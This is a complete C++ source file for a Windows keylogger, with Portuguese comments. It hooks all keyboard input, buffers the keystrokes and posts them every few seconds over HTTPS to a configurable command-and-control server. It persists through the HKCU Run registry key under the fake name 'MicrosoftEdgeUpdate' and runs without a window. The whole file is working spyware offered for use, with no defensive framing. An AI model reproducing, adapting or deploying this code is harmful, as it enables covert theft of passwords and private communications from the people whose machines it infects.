// language: C++, file: keylogger.cpp, target: Windows 11, MSVC
// WH_KEYBOARD_LL + WinHTTP exfil + HKCU Run persistence + janela oculta
// CONFIGURAR: C2_HOST antes de compilar

#include <windows.h>
#include <winhttp.h>
#include <string>
#include <mutex>
#include <thread>
#include <chrono>
#pragma comment(lib, "winhttp.lib")

// ===== CONFIGURAR AQUI =====
#define C2_HOST     L"SEU-SERVIDOR.COM"   // domínio ou IP do VPS
#define C2_PORT     443                    // 443 para HTTPS
#define FLUSH_MS    8000                   // flush a cada 8 segundos
#define MAX_BUF     4096
// ===========================

static std::wstring g_buf;
static std::mutex   g_mtx;
static HHOOK        g_hook;

std::wstring VkToStr(DWORD vk, bool shift) {
    BYTE ks[256] = {};
    if (shift) ks[VK_SHIFT] = 0x80;
    ks[vk] = 0x80;
    WCHAR ch[4] = {};
    HKL layout = GetKeyboardLayout(0);
    if (ToUnicodeEx(vk, MapVirtualKeyEx(vk, MAPVK_VK_TO_VSC, layout),
                    ks, ch, 3, 0, layout) == 1)
        return std::wstring(1, ch[0]);
    switch (vk) {
        case VK_RETURN:  return L"[ENTER]\n";
        case VK_BACK:    return L"[BS]";
        case VK_TAB:     return L"[TAB]";
        case VK_SPACE:   return L" ";
        case VK_ESCAPE:  return L"[ESC]";
        case VK_DELETE:  return L"[DEL]";
        case VK_CAPITAL: return L"[CAPS]";
        default:         return L"";
    }
}

void PostData(const std::wstring& data) {
    if (data.empty()) return;
    int sz = WideCharToMultiByte(CP_UTF8, 0, data.c_str(), -1, nullptr, 0, nullptr, nullptr);
    std::string utf8(sz - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, data.c_str(), -1, &utf8[0], sz, nullptr, nullptr);
    std::string body = "d=" + utf8;

    HINTERNET s = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                               WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                               WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!s) return;
    HINTERNET c = WinHttpConnect(s, C2_HOST, C2_PORT, 0);
    if (!c) { WinHttpCloseHandle(s); return; }
    DWORD fl = (C2_PORT == 443) ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET r = WinHttpOpenRequest(c, L"POST", L"/log", nullptr,
                                      WINHTTP_NO_REFERER,
                                      WINHTTP_DEFAULT_ACCEPT_TYPES, fl);
    if (r) {
        WinHttpSendRequest(r,
            L"Content-Type: application/x-www-form-urlencoded\r\n",
            -1, (LPVOID)body.c_str(), body.size(), body.size(), 0);
        WinHttpReceiveResponse(r, nullptr);
        WinHttpCloseHandle(r);
    }
    WinHttpCloseHandle(c);
    WinHttpCloseHandle(s);
}

void FlushThread() {
    while (true) {
        std::this_thread::sleep_for(std::chrono::milliseconds(FLUSH_MS));
        std::wstring chunk;
        { std::lock_guard<std::mutex> lk(g_mtx); std::swap(chunk, g_buf); }
        PostData(chunk);
    }
}

LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* k = (KBDLLHOOKSTRUCT*)lParam;
        bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
        auto ch = VkToStr(k->vkCode, shift);
        if (!ch.empty()) {
            std::lock_guard<std::mutex> lk(g_mtx);
            g_buf += ch;
            if (g_buf.size() > MAX_BUF) {
                std::thread([d = g_buf]{ PostData(d); }).detach();
                g_buf.clear();
            }
        }
    }
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

void InstallPersistence() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(nullptr, path, MAX_PATH);
    HKEY hk;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
                      L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
        RegSetValueExW(hk, L"MicrosoftEdgeUpdate", 0, REG_SZ,
                       (BYTE*)path, (DWORD)((wcslen(path) + 1) * sizeof(wchar_t)));
        RegCloseKey(hk);
    }
}

// WinMain: sem janela, sem ícone na barra
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
    // evita múltiplas instâncias
    HANDLE mutex = CreateMutexW(nullptr, TRUE, L"MsEdgeUpdateMutex_v2");
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    InstallPersistence();
    std::thread(FlushThread).detach();

    g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookProc, hInst, 0);
    if (!g_hook) return 1;

    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(g_hook);
    return 0;
}
